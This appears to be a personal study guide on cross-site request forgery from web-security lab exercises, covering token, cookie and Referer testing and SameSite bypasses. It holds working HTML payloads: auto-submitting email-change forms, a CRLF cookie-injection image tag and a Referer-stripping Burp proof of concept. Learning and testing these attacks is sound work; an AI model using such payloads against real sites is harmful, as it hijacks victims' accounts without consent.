# CSRF (Cross-Site Request Forgery) Attack Guide

---

## Index

1. [Conditions for a CSRF Attack](#conditions-for-a-csrf-attack)
2. [Testing CSRF Token](#testing-csrf-token)
3. [Testing CSRF Token and CSRF Cookies](#testing-csrf-token-and-csrf-cookies)
   - [Check if CSRF Token is Tied to the CSRF Cookie](#check-if-csrf-token-is-tied-to-the-csrf-cookie)
4. [Exploitation Techniques](#exploitation-techniques)
   - [HTML Exploit Example](#html-exploit-example)
   - [Image-based CSRF Cookie Injection](#image-based-csrf-cookie-injection)
5. [Testing the Referer Header for CSRF Attack](#testing-the-referer-header-for-csrf-attack)
   - [Exploit for Referer Header Validation (Case 1)](#exploit-for-referer-header-validation-case-1)
6. [Bypassing SameSite Lax Policy](#bypassing-samesite-lax-policy)

---

## 1. Conditions for a CSRF Attack

For a CSRF attack to be possible, three key conditions must be in place:

1. **A relevant action**  
2. **Cookie-based session handling**  
3. **No unpredictable request parameters**

---

## 2. Testing CSRF Token

When testing a CSRF token, follow these steps:

1. **Remove CSRF parameter/token**: Check if the application accepts requests without the token.
2. **Change request method (POST to GET)**: Test if changing the method affects token validation.
3. **Exchange CSRF token with another user**: Verify if tokens are user-specific by testing another userâ€™s token.

---

## 3. Testing CSRF Token and CSRF Cookies

### 3.1 Check if CSRF Token is Tied to the CSRF Cookie

1. **Submit an invalid CSRF token**: See if the application accepts it.
2. **Submit a valid CSRF token from another user**: Check if the token is user-specific.
3. **Submit a valid CSRF token and CSRF cookie from another user**: Test if both token and cookie are required to match.
4. **Assign a random value to token + cookie**: In a duplicated token cookie, try setting the same random value to both.

---

## 4. Exploitation Techniques

To exploit a CSRF token + cookie mechanism, two actions are required:

1. **Inject a CSRF cookie into the user's session** (via HTTP header injection)
2. **Send a CSRF attack to the victim**

### 4.1 HTML Exploit Example

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```

### 4.2 Image-based CSRF Cookie Injection

```html
<img src="https://0a5000e9036c9fa3820d15c300a500d4.web-security-academy.net/?search=asdasfa%0d%0aSet-Cookie:%20csrf=testing;%20SameSite=None" onerror="document.forms[0].submit()">
```

---

## 5. Testing the Referer Header for CSRF Attack

1. **Remove the Referer header**: See if the application still processes the request without it.
2. **Validate which part of the Referer header is used**: Identify which part is validated by the application.

   - **Example 1**: `Referer: https://attacker.com/?vulnerable-web.net`
   - **Example 2**: `Referer: http://vulnerable-website.com.attacker-website.com/csrf-attack`

### 5.1 Exploit for Referer Header Validation (Case 1)

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
<head>
<meta name="referrer" content="no-referrer">
</head>
  <body>
    <form action="https://0ac3007703f51dc881598ea300940055.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked&#64;a&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

## 6. Bypassing SameSite Lax Policy

Key Note:
```plaintext
Set-Cookie: session=bciZoELY2ukJUUOj1zJ7wcAGdYXtvq3C; Secure; HttpOnly; SameSite=Strict
```

### Steps

1. **Change request method from POST to GET**: Test if SameSite policy can be bypassed with a GET request.
2. **Via cookie refresh**: Simulate a refresh to force SameSite cookie behavior.

--- 
